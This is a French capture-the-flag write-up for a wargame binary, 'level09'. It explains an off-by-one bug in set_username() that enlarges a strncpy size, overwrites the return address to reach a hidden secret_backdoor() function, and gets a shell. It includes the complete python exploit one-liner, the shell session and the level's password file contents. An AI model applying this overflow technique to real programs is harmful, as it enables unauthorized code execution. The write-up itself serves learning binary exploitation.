@@ -1,0 +1,35 @@
+le programme prend en parametre un username, un message, et termine par "Msg sent!"
+
+Le programme utilise deux fonctions, "set_msg()" et "set_username()". En decompilant nous nous apercevons aussi qu'il existe une fonction "secret_backdoor()" qui n'est pas appelée et qui prend une chaine de caractere avec fgets() et l'execute dans "system()".
+
+En analysant à l'aide de gdb on remarque que la fonction handle_msg() stocke les informations d'input dans la structure suivante:
+
+{
+    char	message[140]; // 0
+    char	username[40]; // +140
+    int		size;		  // +180
+}
+
+Dans la fonction "set_username()" le while est mal codé, une verification est faite sur < 41 au lieu de < 40 sur l'username qui est de taille 40, ce qui permet d'overflow de 1.
+
+Nous pouvons utiliser l'overflow de 1 pour écrire sur la size, qui est le paramètre du strncpy de set_msg(). On peut y mettre une grosse valeur afin d'avoir la place pour exploit. L'overflow de 1 nous permet de placer au mieux le size à 255 en lui passant \xff.
+
+Le but va être d'appeler secret_backdoor() à l'aide du strncpy() de set_msg() tout en changeant son paramètre pour nous lancer un terminal.
+
+On utilise gdb-peda pour pour obtenir l'adresse de RBP, on calcule son offset et on ajoute 8 pour overwrite RSP.
+
+On récupère l'adresse de la fonction secret_backdoor -> 0x000055555555488c
+
+On crée le crack: 40 (username) + \xff (255 dans le strncpy) + \n + 200 (offset rbp + rsp) + 0x000055555555488c (adresse secret_backdoor) + \n + /bin/sh (terminal)
+
+(python -c 'print "B"*40+"\xff"+"\n"+"B"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00"+"\n"+"/bin/sh\n"'; cat) | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB>: Msg @Unix-Dude
+>>: >: Msg sent!
+whoami
+end
+cat ~end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
